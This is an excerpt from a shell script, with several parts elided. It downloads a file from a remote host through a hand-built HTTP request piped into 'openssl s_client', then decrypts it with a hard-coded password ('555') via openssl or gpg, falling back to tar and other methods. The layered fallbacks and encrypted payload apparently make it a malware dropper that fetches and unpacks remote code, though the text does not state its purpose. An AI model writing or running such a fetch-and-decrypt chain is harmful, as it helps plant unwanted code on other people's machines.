...
#  openssl
echo "Is downloaded 1: $IS_DOWNLOADED"
if [ $IS_DOWNLOADED -eq 0 ]; then
  if command -v openssl > /dev/null; then
    echo "[*] Downloading OpenSSL version to $HOME/$FILENAME_TMP"
    if [ "$APP" == "openssl" ]; then
#      if (echo -e $QUERY_SSL | openssl s_client -quiet -connect $REMOTE_HOST:$REMOTE_PORT 2>/dev/null > $HOME/$FILENAME_TMP); then
      if (printf "GET /$REMOTE_PATH/$FILENAME_SSL HTTP/1.1\r\nHost: $REMOTE_HOST\r\nConnection: close\r\n\r\n" | openssl s_client -quiet -connect $REMOTE_HOST:$REMOTE_PORT 2>/dev/null > $HOME/$FILENAME_TMP); then
        CONTENT_LENGTH=$(cat $HOME/$FILENAME_TMP | grep -a -i "Content-Length:" | cut -d' ' -f2 | tr -d "\r\n")
        if (tail -c $CONTENT_LENGTH $HOME/$FILENAME_TMP > $HOME/$FILENAME_SSL); then
          IS_DOWNLOADED=1
          echo "Is downloaded 1_1: $IS_DOWNLOADED"
      ...
      if ($APP $HOME/$FILENAME_SSL $DOWNLOAD_SSL); then
        IS_DOWNLOADED=1
        echo "Is downloaded 1_2: $IS_DOWNLOADED"
        echo "Download complete"
      else
  ...
  echo "Is downloaded 1_3: $IS_DOWNLOADED"
  if [ $IS_DOWNLOADED -eq 1 ]; then
    ...
    if ! (openssl enc -aes-256-cbc -d -in $HOME/$FILENAME_SSL -out $HOME/$FILENAME -pass pass:555); then
      ...
      IS_DOWNLOADED=0
      echo "Is downloaded 1_4: $IS_DOWNLOADED"
    fi
...
# gpg
echo "Is downloaded 2: $IS_DOWNLOADED"
if [ $IS_DOWNLOADED -eq 0 ]; then
  if command -v gpg > /dev/null; then
    echo "[*] Downloading GPG version to $HOME/$FILENAME_GPG"
    if [ "$APP" == "openssl" ]; then
#      if (echo -e $QUERY_GPG | openssl s_client -quiet -connect $REMOTE_HOST:$REMOTE_PORT 2>/dev/null > $HOME/$FILENAME_TMP); then
      if (printf "GET /$REMOTE_PATH/$FILENAME_GPG HTTP/1.1\r\nHost: $REMOTE_HOST\r\nConnection: close\r\n\r\n" | openssl s_client -quiet -connect $REMOTE_HOST:$REMOTE_PORT 2>/dev/null > $HOME/$FILENAME_TMP); then
        CONTENT_LENGTH=$(cat $HOME/$FILENAME_TMP | grep -a -i "Content-Length:" | cut -d' ' -f2 | tr -d "\r\n")
        if (tail -c $CONTENT_LENGTH $HOME/$FILENAME_TMP > $HOME/$FILENAME_GPG); then
          IS_DOWNLOADED=1
          echo "Is downloaded 2_1: $IS_DOWNLOADED"
        else
      ...
      if ($APP $HOME/$FILENAME_GPG $DOWNLOAD_GPG); then
        IS_DOWNLOADED=1
        echo "Is downloaded 2_2: $IS_DOWNLOADED"
      else
  ...
  echo "Is downloaded 2_3: $IS_DOWNLOADED"
  if [ $IS_DOWNLOADED -eq 1 ]; then
    ...
    if ! (echo "555" | gpg --batch --passphrase-fd 0 --output $HOME/$FILENAME --decrypt $HOME/$FILENAME_GPG); then
      ...
      IS_DOWNLOADED=0
      echo "Is downloaded 2_4: $IS_DOWNLOADED"
    fi
    rm $HOME/$FILENAME_GPG
  fi
fi

# tar
echo "Is downloaded 3: $IS_DOWNLOADED"
if [ $IS_DOWNLOADED -eq 0 ]; then
  echo "[*] Downloading TAR version to $HOME/$FILENAME"
  if [ "$APP" == "openssl" ]; then
#    if (echo -e $QUERY_TAR | openssl s_client -quiet -connect $REMOTE_HOST:$REMOTE_PORT 2>/dev/null > $HOME/$FILENAME_TMP); then
    if (printf "GET /$REMOTE_PATH/$FILENAME HTTP/1.1\r\nHost: $REMOTE_HOST\r\nConnection: close\r\n\r\n" | openssl s_client -quiet -connect $REMOTE_HOST:$REMOTE_PORT 2>/dev/null > $HOME/$FILENAME_TMP); then
      CONTENT_LENGTH=$(cat $HOME/$FILENAME_TMP | grep -a -i "Content-Length:" | cut -d' ' -f2 | tr -d "\r\n")
      if (tail -c $CONTENT_LENGTH $HOME/$FILENAME_TMP > $HOME/$FILENAME_TAR); then
        IS_DOWNLOADED=1
        echo "Is downloaded 3_1: $IS_DOWNLOADED"
      else
        echo "WARNING: Can't download TAR version, 'tail' failed"
      fi
      rm $HOME/$FILENAME_TMP
    else
      echo "WARNING: Can't download TAR version, 'openssl' failed"
    fi
  else
    if ($APP $HOME/$FILENAME $DOWNLOAD_TAR); then
      IS_DOWNLOADED=1
      echo "Is downloaded 3_2: $IS_DOWNLOADED"
    else
...
# last
echo "Is downloaded 4: $IS_DOWNLOADED"
if [ $IS_DOWNLOADED -eq 0 ]; then
